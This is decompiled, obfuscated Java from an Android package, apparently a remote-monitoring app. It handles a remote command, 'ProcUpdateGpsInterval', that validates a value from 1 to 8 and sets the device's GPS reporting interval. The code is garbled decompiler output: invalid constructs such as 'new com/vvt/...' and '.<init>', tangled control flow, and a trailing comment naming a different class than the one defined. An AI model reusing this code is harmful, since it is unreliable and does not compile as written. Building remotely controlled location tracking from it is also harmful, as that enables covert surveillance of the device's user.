package com.vvt.remotecommand.processor.c;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import java.util.ArrayList;

public class c
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public c(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, com.vvt.remotecommand.processor.c paramc)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    int k = -1;
    boolean bool4 = a;
    if (bool4) {}
    int m = ((ArrayList)localObject1).size();
    ControlCommand localControlCommand;
    if (m == i)
    {
      m = 0;
      localControlCommand = null;
      localObject1 = (String)((ArrayList)localObject1).get(0);
    }
    for (;;)
    {
      boolean bool3;
      try
      {
        j = Integer.parseInt((String)localObject1);
      }
      catch (NumberFormatException localNumberFormatException)
      {
        int j = k;
        continue;
        bool3 = a;
        if (!bool3) {
          continue;
        }
        com.vvt.remotecontrol.a locala = h();
        boolean bool5 = a;
        if (!bool5) {
          continue;
        }
        localControlCommand = new com/vvt/remotecontrol/ControlCommand;
        RemoteFunction localRemoteFunction = RemoteFunction.SET_GPS_TIME_INTERVAL;
        Object localObject2 = Integer.valueOf(j);
        localControlCommand.<init>(localRemoteFunction, localObject2);
        locala.execute(localControlCommand);
        if (paramc == null) {
          continue;
        }
        localObject2 = "";
        paramc.b(paramRemoteCommand, this, (String)localObject2);
        bool2 = a;
        if (!bool2) {
          continue;
        }
        return;
      }
      if (j >= i)
      {
        k = 8;
        if (j <= k) {}
      }
      else
      {
        localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject1).<init>();
        throw ((Throwable)localObject1);
      }
      boolean bool2 = bool3;
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcUpdateGpsInterval";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */